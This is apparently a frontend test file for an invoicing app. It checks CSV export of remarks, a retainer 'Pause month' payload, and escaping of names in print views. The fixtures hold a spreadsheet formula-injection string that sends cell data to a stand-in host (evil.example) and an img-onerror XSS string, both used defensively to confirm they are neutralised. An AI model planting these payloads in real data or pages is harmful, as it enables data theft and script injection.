/**
 * Invoice-page actions, driven through the real pages.
 *
 * CSV export: a remark is free text that editors and public edit links can
 * write, and the export copied it verbatim — so =HYPERLINK(...) became a live
 * formula in finance's spreadsheet.
 *
 * Pause month: the retainer "Pause month" button posted amount_raised=0 and
 * amount_with_tax=0. The API refuses a non-positive invoice amount, so every
 * pause failed with a 422 (shown as "[object Object]") and the month stayed
 * "Missing". A pause carries no amount, and the fields are optional.
 *
 * Print: the print views are written into a new window as HTML, and the
 * project and client names went in as markup, so a name like
 * "<img onerror=…>" ran in a window that shares the app's origin.
 */
import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest'
import { render, screen, fireEvent, waitFor, act } from '@testing-library/react'
import { MemoryRouter } from 'react-router-dom'

const { api, retainerRecord, toastFn } = vi.hoisted(() => {
  // Last month's retainer invoice: the template, with this month "Missing".
  const d = new Date()
  const lastMonth = new Date(d.getFullYear(), d.getMonth() - 1, 15)
  const raised = `${lastMonth.getFullYear()}-${String(lastMonth.getMonth() + 1).padStart(2, '0')}-01`
  const retainerRecord = {
    id: 'recRet1',
    fields: {
      'Invoice Number': 'RET-001', 'Project': 'Acme Retainer', 'Client Name': 'Acme',
      'Category': 'Development- Retainer', 'Payment Status': 'Paid', 'Currency': 'RS',
      'Raised Date': raised, 'Cleared Date': raised, 'Raised By': 'am@example.com',
      'Amount Raised': 50000, 'Amount with Tax': 59000, 'Amount Received': 59000,
      'Outstanding Amount': -250,
      'Remark': '=HYPERLINK("https://evil.example/?d="&B2,"Open invoice")',
    },
  }

  const anything = () => {
    const own = new Map()
    return new Proxy(function () {}, {
      get(target, key) {
        if (typeof key === 'symbol') return undefined
        if (key === 'then') return undefined
        if (!own.has(key)) own.set(key, anything())
        return own.get(key)
      },
      apply: () => Promise.resolve({ records: [] }),
    })
  }
  const ns = (obj) => {
    const spare = new Map()
    return new Proxy(obj, {
      get(t, k) {
        if (k in t) return t[k]
        if (typeof k === 'symbol') return undefined
        if (!spare.has(k)) spare.set(k, anything())
        return spare.get(k)
      },
    })
  }
  const ok = (v) => vi.fn().mockResolvedValue(v)
  const summary = { total_raised: 50000, total_received: 59000, total_outstanding: 0, collection_rate: 100, by_status: { Paid: 1 } }
  const api = ns({
    invoices: ns({
      list: ok({ records: [retainerRecord] }),
      summary: ok(summary),
      agingBuckets: ok({ buckets: [] }),
      picklists: ok({}),
      create: ok({ id: 'recPaused' }),
      // The Invoices page reads GET /api/invoices/query.
      queryPath: (params = {}) => `/api/invoices/query?${new URLSearchParams(Object.entries(params).filter(([, v]) => v != null && v !== ''))}`,
      query: vi.fn().mockResolvedValue({
        data: {
          records: [retainerRecord], total: 1, next_cursor: null,
          aggregates: { count: 1, raised: 50000, totals: {}, aging: {}, by_project: [], raised_months: [], cleared_months: [] },
          workspace: { count: 1, raised: 50000, totals: {}, aging: {}, by_status: { Paid: { count: 1, amount: 50000 } }, by_project: [], raised_months: [], cleared_months: [], facets: { months: [] }, recent_projects: [], overdue_top: [] },
        },
        etag: '"x"',
      }),
      exportCsv: ok({ blob: new Blob(['Invoice Number\n']), filename: 'invoices_2026-10-30.csv' }),
    }),
    webInvoices: ns({
      list: ok({ records: [retainerRecord], total: 1 }),
      summary: ok(summary),
      agingBuckets: ok({ buckets: [] }),
      avatarMap: ok({}),
      picklists: ns({ get: ok({}) }),
      create: ok({ id: 'recWebPaused' }),
    }),
  })
  const toastFn = Object.assign(vi.fn(), { showToast: vi.fn() })
  return { api, retainerRecord, toastFn }
})

vi.mock('../services/api', () => ({
  api, API_BASE_URL: '', getAuthToken: () => '', setAuthToken: vi.fn(), clientCacheBust: vi.fn(),
}))
vi.mock('../context/AuthContext', () => ({
  useAuth: () => ({
    status: 'authed', role: 'all', authRole: 'superadmin', isAdmin: true, isViewer: false,
    isWeb: false, isAll: true, isEditor: true, isImpersonating: false, isEmailAuth: false,
    user: { email: 'a@b.c' }, userEmail: 'a@b.c',
    hasPerm: () => true,
  }),
  AuthProvider: ({ children }) => children,
}))
vi.mock('../context/ThemeContext', () => ({
  useTheme: () => ({ dark: false, toggle: vi.fn() }),
  ThemeProvider: ({ children }) => children,
}))
vi.mock('../context/ToastContext', () => ({
  useToast: () => toastFn,
  ToastProvider: ({ children }) => children,
}))
vi.mock('../hooks/usePageMeta', () => ({ usePageMeta: vi.fn() }))
vi.mock('../context/ConfirmContext', () => ({
  useConfirm: () => vi.fn().mockResolvedValue(true),
  ConfirmProvider: ({ children }) => children,
}))

import Invoices from '../pages/Invoices'
import WebInvoices from '../pages/WebInvoices'
import TaxLedger from '../pages/TaxLedger'

beforeEach(() => {
  vi.clearAllMocks()
  vi.stubGlobal('IntersectionObserver', class {
    constructor(cb) { this.cb = cb }
    observe(el) { this.cb([{ isIntersecting: true, target: el }]) }
    unobserve() {} disconnect() {}
  })
  vi.stubGlobal('ResizeObserver', class { observe() {} unobserve() {} disconnect() {} })
  window.matchMedia = window.matchMedia || (q => ({
    matches: false, media: q, onchange: null,
    addListener: vi.fn(), removeListener: vi.fn(),
    addEventListener: vi.fn(), removeEventListener: vi.fn(), dispatchEvent: vi.fn(),
  }))
  vi.stubGlobal('prompt', vi.fn(() => 'client on leave'))
})
afterEach(() => vi.unstubAllGlobals())

describe('Invoices CSV export', () => {
  // The server writes the file (every invoice in scope, formula text
  // neutralised — pinned in backend/tests/test_invoice_query_pg.py); the page
  // asks for it and saves what comes back.
  it('downloads the server-built file for all records', async () => {
    let blob = null
    URL.createObjectURL = vi.fn((b) => { blob = b; return 'blob:csv' })
    URL.revokeObjectURL = vi.fn()
    render(<MemoryRouter><Invoices /></MemoryRouter>)
    fireEvent.click(await screen.findByTitle('Download invoices as CSV'))
    await act(async () => { fireEvent.click(await screen.findByRole('button', { name: /All records \(1\)/ })) })

    await waitFor(() => expect(api.invoices.exportCsv).toHaveBeenCalledTimes(1))
    expect(api.invoices.exportCsv.mock.calls[0][0]).not.toHaveProperty('q')
    expect(await blob.text()).toBe('Invoice Number\n')
  })
})

describe('Retainer "Pause month"', () => {
  it.each([
    ['Invoices', Invoices, '/', () => api.invoices.create],
    ['WebInvoices', WebInvoices, '/?tab=retainers', () => api.webInvoices.create],
  ])('%s records a Cancelled month without zero amounts', async (name, Page, url, create) => {
    render(<MemoryRouter initialEntries={[url]}><Page /></MemoryRouter>)
    if (name === 'Invoices') {
      await screen.findAllByText('RET-001')
      fireEvent.click(screen.getAllByRole('button', { name: 'Retainers' })[0])
    }
    const pause = (await screen.findAllByRole('button', { name: 'Pause month' }))[0]
    await act(async () => { fireEvent.click(pause) })

    await waitFor(() => expect(create()).toHaveBeenCalledTimes(1))
    const payload = create().mock.calls[0][0]
    expect(payload).toMatchObject({ project: 'Acme Retainer', payment_status: 'Cancelled' })
    expect(payload.remark).toContain('client on leave')
    // The API refuses 0 (and any non-positive amount); a pause has none.
    expect(payload.amount_raised).toBeUndefined()
    expect(payload.amount_with_tax).toBeUndefined()
    expect(JSON.parse(JSON.stringify(payload))).not.toHaveProperty('amount_raised')
    expect(retainerRecord.fields['Amount Raised']).toBe(50000)   // template untouched
  })
})

describe('Print views', () => {
  const HOSTILE = '<img src=x onerror="alert(1)">'
  const hostile = { ...retainerRecord, id: 'recHostile', fields: { ...retainerRecord.fields, 'Project': HOSTILE, 'Client Name': HOSTILE, 'Invoice Number': '<b>INV-9</b>' } }

  it.each([
    ['WebInvoices', WebInvoices, '/?tab=invoices', () => api.webInvoices.list, 'Print invoice list'],
    ['TaxLedger', TaxLedger, '/', () => api.invoices.list, /^Print$/],
  ])('%s escapes record text in the printed HTML', async (name, Page, url, list, button) => {
    const written = []
    const win = { document: { write: (h) => written.push(h), close: vi.fn() }, focus: vi.fn(), print: vi.fn(), close: vi.fn() }
    vi.stubGlobal('open', vi.fn(() => win))
    list().mockResolvedValue({ records: [hostile], total: 1 })
    try {
      render(<MemoryRouter initialEntries={[url]}><Page /></MemoryRouter>)
      const btn = typeof button === 'string'
        ? await screen.findByTitle(button)
        : await screen.findByRole('button', { name: button })
      // Print again until the loaded records are in the page.
      await waitFor(() => {
        fireEvent.click(btn)
        expect(written.at(-1)).toContain('&lt;img src=x onerror="alert(1)"&gt;')
      })
      const html = written.at(-1)
      expect(html).toContain('&lt;b&gt;INV-9&lt;/b&gt;')
      expect(html).not.toContain('<img')
      expect(html).not.toContain('<b>INV-9')
    } finally {
      list().mockResolvedValue({ records: [retainerRecord], total: 1 })
    }
  })
})
